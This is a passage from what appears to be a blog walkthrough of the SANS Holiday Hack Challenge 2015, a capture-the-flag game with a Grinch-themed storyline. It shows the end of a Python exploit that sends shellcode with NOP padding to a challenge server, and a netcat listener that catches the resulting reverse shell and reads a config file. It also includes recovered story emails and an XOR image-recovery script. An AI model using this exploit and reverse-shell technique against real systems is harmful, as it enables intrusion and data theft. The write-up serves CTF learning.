    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x6b\x93\x04\x08&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c"&gt;# padding to get a length of 200 bytes&lt;/span&gt;

    &lt;span class="c"&gt;# We connect to our distant server&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;settimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;54.233.105.81&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4242&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="c"&gt;# We receive all the data we can&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;pass&lt;/span&gt;

    &lt;span class="c"&gt;# We enter the secret command&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;X&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c"&gt;# We receive all the data we can&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;pass&lt;/span&gt;

    &lt;span class="c"&gt;# We send our payload&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We launch our exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./exploit_sg05.py
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And in another terminal, on the server I own:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nc -lvp 8080
listening on &lt;span class="o"&gt;[&lt;/span&gt;any&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;8080&lt;/span&gt; ...
connect to &lt;span class="o"&gt;[&lt;/span&gt;192.168.XX.XX&lt;span class="o"&gt;]&lt;/span&gt; from ec2-54-233-105-81.sa-east-1.compute.amazonaws.com &lt;span class="o"&gt;[&lt;/span&gt;54.233.105.81&lt;span class="o"&gt;]&lt;/span&gt; 42021
cat /gnome/www/files/gnome.conf
Gnome Serial Number: 4CKL3R43V4
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-05
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The flag for this SuperGnome is &lt;code&gt;4CKL3R43V4&lt;/code&gt;
(&lt;a class="reference external" href="http://www.sou.edu/cs/lynnackler.html"&gt;geeky reference&lt;/a&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="part-5-baby-its-gnome-outside-sinister-plot-and-attribution"&gt;
&lt;h2&gt;Part 5: Baby, It’s Gnome Outside: &lt;em&gt;Sinister Plot and Attribution&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;We can see on the SuperGnomes some capture files, inside ZIP archives. We can
also see from a conversation on the GnomeNET on the SuperGnomes that someone
has a problem with the pictures taken by the gnomes: if some gnomes have the
same name, the uploaded images get scrambled together (the RGB pixels are
XORed with one another):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to GnomeNET.&lt;/p&gt;
&lt;p&gt;I noticed an issue when there are multiple child-gnomes with the same name.
The image feeds become scrambled together. Any way to resolve this other
than rename the gnomes?? ~DW&lt;/p&gt;
&lt;p&gt;Can you provide an example of the scrambling you're seeing? ~PS&lt;/p&gt;
&lt;p&gt;I uploaded 'camera_feed_overlap_error.png' to SG-01. We have six factory
test cameras all named the same. The issue occurs only when they have the
same name. It occurs even if the cameras are not transmitting an image. ~PS&lt;/p&gt;
&lt;p&gt;Oh, also, in the image, 5 of the cameras are just transmitting the 'camera
disabled' static, the 6th one was in the boss' office. The door was locked
and the boss seemed busy, so I didn't mess with that one. ~PS&lt;/p&gt;
&lt;p&gt;To help me troubleshoot this, can you grab a still from all six cameras at
the same time? Also, is this really an issue? ~DW&lt;/p&gt;
&lt;p&gt;I grabbed a still from 5 of the 6 cameras, again, staying out of the boss'
office! Each cam is directed to a different SG, so each SG has one of the
5 stills I manually snagged. I named them 'factory_cam_#.png' and pushed
them up to the files menu. 'camera_feed_overlap_error.png' has that garbled
image. Oh, and to answer your question. Yes. We have almost 2 million
cameras... some of them WILL be named the same. Just fix it. ~PS&lt;/p&gt;
&lt;p&gt;Took a look at your issue. It looks like the camera feed collector only
cares about the name and will merge the feeds. Looks like each pixel is
XORed... Its going to be a lot of work to fix this. We are too late in
the game to push a new update to all the cameras... stop naming cameras
the same name. ~DW&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So we have six images: five from some gnomes and one from the boss' office.
By recovering the five images and XORing them with the sixth image, we can
see an image from the boss' office!&lt;/p&gt;
&lt;p&gt;By using the vulnerabilities from Part 4, we can recover the capture file
and the images.&lt;/p&gt;
&lt;p&gt;You can download the capture files here:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20141226101055_1.pcap"&gt;First capture file&lt;/a&gt;
(sha256: &lt;code&gt;a15a537562a4c828bf9eebd09f8f99686df76a4854a741a2df63902a023a1cea&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20150225093040_2.pcap"&gt;Second capture file&lt;/a&gt;
(sha256: &lt;code&gt;d4481450877d1468fba6c038f2a2c7b72eaab80540dda07fcc28b0a63045bd0c&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20151201113358_3.pcap"&gt;Third capture file&lt;/a&gt;
(sha256: &lt;code&gt;f12950e677cfa1646c1c616a62d063497cf0d2cc9cea3a0167ad302a02b682c8&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20151203133818_4.pcap"&gt;Fourth capture file&lt;/a&gt;
(sha256: &lt;code&gt;45f076467bdd69d4855d21726f398f246b7179e499fde663b4f6c7e77ba39025&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20151215161015_5.pcap"&gt;Fifth capture file&lt;/a&gt;
(sha256: &lt;code&gt;5a637e03e9a2ea4b4fde5437eabd281d2e78c6b383a31f0e705dd9da2ec6c12a&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can download the images here:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_1.png"&gt;First factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_2.png"&gt;Second factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_3.png"&gt;Third factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_4.png"&gt;Fourth factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_5.png"&gt;Fifth factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/camera_feed_overlap_error.png"&gt;Camera overlay image&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let's look at the capture files first. By opening them with Wireshark,
we can see some SMTP and IMAP traffic.By using the wonderful
&amp;quot;Follow TCP Stream&amp;quot; functionnality, we can recover the full traffic.&lt;/p&gt;
&lt;div class="section" id="first-capture-file"&gt;
&lt;h3&gt;First capture file&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;c&amp;quot; &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
To: &amp;lt;jojo&amp;#64;atnascorp.com&amp;gt;
Subject: GiYH Architecture
Date: Fri, 26 Dec 2014 10:10:55 -0500

JoJo,

As you know, I hired you because you are the best architect in town for a
distributed surveillance system to satisfy our rather unique business
requirements.  We have less than a year from today to get our final plans in
place.  Our schedule is aggressive, but realistic.

I've sketched out the overall Gnome in Your Home architecture in the diagram
attached below.  Please add in protocol details and other technical
specifications to complete the architectural plans.

Remember: to achieve our goal, we must have the infrastructure scale to
upwards of 2 million Gnomes.  Once we solidify the architecture, you'll work
with the hardware team to create device specs and we'll start procuring
hardware in the February 2015 timeframe.

I've also made significant progress on distribution deals with retailers.

Thoughts?

Looking forward to working with you on this project!

-C
&lt;/pre&gt;
&lt;p&gt;Attached to this email is this image:&lt;/p&gt;
&lt;img alt="giyh_architecture.jpg" class="align-center" src="/images/sans-christmas-challenge-2015/giyh_architecture.jpg" /&gt;
&lt;/div&gt;
&lt;div class="section" id="second-capture-file"&gt;
&lt;h3&gt;Second capture file&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;c&amp;quot; &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
To: &amp;lt;supplier&amp;#64;ginormouselectronicssupplier.com&amp;gt;
Subject: Large Order - Immediate Attention Required
Date: Wed, 25 Feb 2015 09:30:39 -0500

Maratha,

As a follow-up to our phone conversation, we'd like to proceed with an order
of parts for our upcoming product line.  We'll need two million of each of
the following components:

* Ambarella S2Lm IP Camera Processor System-on-Chip (with an ARM Cortex A9
  CPU and Linux SDK)
* ON Semiconductor AR0330: 3 MP 1/3&amp;quot; CMOS Digital Image Sensor
* Atheros AR6233X Wi-Fi adapter
* Texas Instruments TPS65053 switching power supply
* Samsung K4B2G16460 2GB SSDR3 SDRAM
* Samsung K9F1G08U0D 1GB NAND Flash

Given the volume of this purchase, we fully expect the 35% discount you
mentioned during our phone discussion.  If you cannot agree to this pricing,
we'll place our order elsewhere.

We need delivery of components to begin no later than April 1, 2015, with
250,000 units coming each week, with all of them arriving no later than June
1, 2015.


Finally, as you know, this project requires the utmost secrecy.   Tell NO
ONE about our order, especially any nosy law enforcement authorities.

Regards,

-CW
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="third-capture-file"&gt;
&lt;h3&gt;Third capture file&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;c&amp;quot; &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
To: &amp;lt;burglerlackeys&amp;#64;atnascorp.com&amp;gt;
Subject: All Systems Go for Dec 24, 2015
Date: Tue, 1 Dec 2015 11:33:56 -0500

My Burgling Friends,

Our long-running plan is nearly complete, and I'm writing to share the date
when your thieving will commence!  On the morning of December 24, 2015, each
individual burglar on this email list will receive a detailed itinerary of
specific houses and an inventory of items to steal from each house, along
with still photos of where to locate each item.  The message will also
include a specific path optimized for you to hit your assigned houses
quickly and efficiently the night of December 24, 2015 after dark.

Further, we've selected the items to steal based on a detailed analysis of
what commands the highest prices on the hot-items open market.  I caution
you - steal only the items included on the list.  DO NOT waste time grabbing
anything else from a house.  There's no sense whatsoever grabbing crumbs too
small for a mouse!

As to the details of the plan, remember to wear the Santa suit we provided
you, and bring the extra large bag for all your stolen goods.

If any children observe you in their houses that night, remember to tell
them that you are actually &amp;quot;Santy Claus&amp;quot;, and that you need to send the
specific items you are taking to your workshop for repair.  Describe it in a
very friendly manner, get the child a drink of water, pat him or her on the
head, and send the little moppet back to bed.  Then, finish the deed, and
get out of there.  It's all quite simple - go to each house, grab the loot,
and return it to the designated drop-off area so we can resell it.  And,
above all, avoid Mount Crumpit!

As we agreed, we'll split the proceeds from our sale 50-50 with each
burglar.

Oh, and I've heard that many of you are asking where the name ATNAS comes
from.  Why, it's reverse SANTA, of course.  Instead of bringing presents on
Christmas, we'll be stealing them!

Thank you for your partnership in this endeavor.

Signed:

-CLW

President and CEO of ATNAS Corporation
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="fourth-capture-file"&gt;
&lt;h3&gt;Fourth capture file&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;c&amp;quot; &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
To: &amp;lt;psychdoctor&amp;#64;whovillepsychiatrists.com&amp;gt;
Subject: Answer To Your Question
Date: Thu, 3 Dec 2015 13:38:15 -0500

Dr. O'Malley,

In your recent email, you inquired:

&amp;gt; When did you first notice your anxiety about the holiday season?

Anxiety is hardly the word for it.  It's a deep-seated hatred, Doctor.

Before I get into details, please allow me to remind you that we operate
under the strictest doctor-patient confidentiality agreement in the
business.  I have some very powerful lawyers whom I'd hate to invoke in the
event of some leak on your part.  I seek your help because you are the best
psychiatrist in all of Who-ville.

To answer your question directly, as a young child (I must have been no more
than two), I experienced a life-changing interaction.  Very late on
Christmas Eve, I was awakened to find a grotesque green Who dressed in a
tattered Santa Claus outfit, standing in my barren living room, attempting
to shove our holiday tree up the chimney.  My senses heightened, I put on my
best little-girl innocent voice and asked him what he was doing.  He
explained that he was &amp;quot;Santy Claus&amp;quot; and needed to send the tree for repair.
I instantly knew it was a lie, but I humored the old thief so I could escape
to the safety of my bed.  That horrifying interaction ruined Christmas for
me that year, and I was terrified of the whole holiday season throughout my
teen years.

I later learned that the green Who was known as &amp;quot;the Grinch&amp;quot; and had lost
his mind in the middle of a crime spree to steal Christmas presents.  At the
very moment of his criminal triumph, he had a pitiful change of heart and
started playing all nicey-nice.  What an amateur!  When I became an adult,
my fear of Christmas boiled into true hatred of the whole holiday season.  I
knew that I had to stop Christmas from coming.  But how?

I vowed to finish what the Grinch had started, but to do it at a far larger
scale.  Using the latest technology and a distributed channel of burglars,
we'd rob 2 million houses, grabbing their most precious gifts, and selling
them on the open market.  We'll destroy Christmas as two million homes full
of people all cry &amp;quot;BOO-HOO&amp;quot;, and we'll turn a handy profit on the whole
deal.

Is this &amp;quot;wrong&amp;quot;?  I simply don't care.  I bear the bitter scars of the
Grinch's malfeasance, and singing a little &amp;quot;Fahoo Fores&amp;quot; isn't gonna fix
that!

What is your advice, doctor?

Signed,

Cindy Lou Who
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="fifth-capture-file"&gt;
&lt;h3&gt;Fifth capture file&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;Grinch&amp;quot; &amp;lt;grinch&amp;#64;who-villeisp.com&amp;gt;
To: &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
Subject: My Apologies &amp;amp; Holiday Greetings
Date: Tue, 15 Dec 2015 16:09:40 -0500

Dear Cindy Lou,

I am writing to apologize for what I did to you so long ago.  I wronged you
and all the Whos down in Who-ville due to my extreme misunderstanding of
Christmas and a deep-seated hatred.  I should have never lied to you, and I
should have never stolen those gifts on Christmas Eve.  I realize that even
returning them on Christmas morn didn't erase my crimes completely.  I seek
your forgiveness.

You see, on Mount Crumpit that fateful Christmas morning, I learned th[4 bytes missing in capture file]at
Christmas doesn't come from a store.  In fact, I discovered that Christmas
means a whole lot more!

When I returned their gifts, the Whos embraced me.  They forgave.  I was
stunned, and my heart grew even more.  Why, they even let me carve the roast
beast!  They demonstrated to me that the holiday season is, in part, about
forgiveness and love, and that's the gift that all the Whos gave to me that
morning so long ago.  I honestly tear up thinking about it.

I don't expect you to forgive me, Cindy Lou.  But, you have my deepest and
most sincere apologies.

And, above all, don't let my horrible actions from so long ago taint you in
any way.  I understand you've grown into an amazing business leader.  You
are a precious and beautiful Who, my dear.  Please use your skills wisely
and to help and support your fellow Who, especially during the holidays.

I sincerely wish you a holiday season full of kindness and warmth,

--The Grinch
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="let-s-unxor-the-images"&gt;
&lt;h3&gt;Let's unXOR the images&lt;/h3&gt;
&lt;p&gt;With a simple Python script, we can take every image and XOR the RGB pixels
to recover the image from the boss' office:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;PIL&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c"&gt;# We open the camera feed overlap image&lt;/span&gt;
    &lt;span class="n"&gt;scrambled_image&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;convert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;RGB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;scrambled_image_pixels&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;scrambled_image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;height&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;scrambled_image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;

    &lt;span class="c"&gt;# For every image found in one of the SuperGnomes&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
        &lt;span class="n"&gt;image_pixels&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;convert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;RGB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="c"&gt;# We take the RGB components&lt;/span&gt;
                &lt;span class="n"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;g1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;scrambled_image_pixels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;g2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;image_pixels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="c"&gt;# And we XOR them to recover the original value&lt;/span&gt;
                &lt;span class="n"&gt;scrambled_image_pixels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r1&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;g1&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;g2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b1&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;b2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c"&gt;# We save the result in a new image&lt;/span&gt;
    &lt;span class="n"&gt;scrambled_image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;result.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;PNG&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then, we just have to run this script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./unxor_images.py sg01/factory_cam_1.png sg02/factory_cam_2.png sg03/factory_cam_3.png &lt;span class="se"&gt;\&lt;/span&gt;
    sg04/factory_cam_4.png sg05/factory_cam_5.png camera_feed_overlap_error.png
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This gives us the resulting image:&lt;/p&gt;
&lt;img alt="sans_xor_image_result.png" class="align-center" src="/images/sans-christmas-challenge-2015/sans_xor_image_result.png" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="epilogue-twas-the-gnome-before-christmas-wrapping-it-all-up"&gt;
&lt;h2&gt;Epilogue: ‘Twas the Gnome Before Christmas: &lt;em&gt;Wrapping It All Up&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;As in every SANS Christmas Challenge, we have to answer several
questions:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Which commands are sent across the Gnome’s command-and-control
channel?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The command sent to the command-and-control server are &lt;code&gt;iwconfig&lt;/code&gt; and
&lt;code&gt;cat /tmp/iwlistscan.txt&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="2"&gt;
&lt;li&gt;What image appears in the photo the Gnome sent across the
channel from the Dosis home?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We can see a picture of Josh's bedroom.&lt;/p&gt;
&lt;ol class="arabic simple" start="3"&gt;
&lt;li&gt;What operating system and CPU type are used in the Gnome?
What type of web framework is the Gnome web interface built in?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The Gnome is running OpenWRT in the development branch.
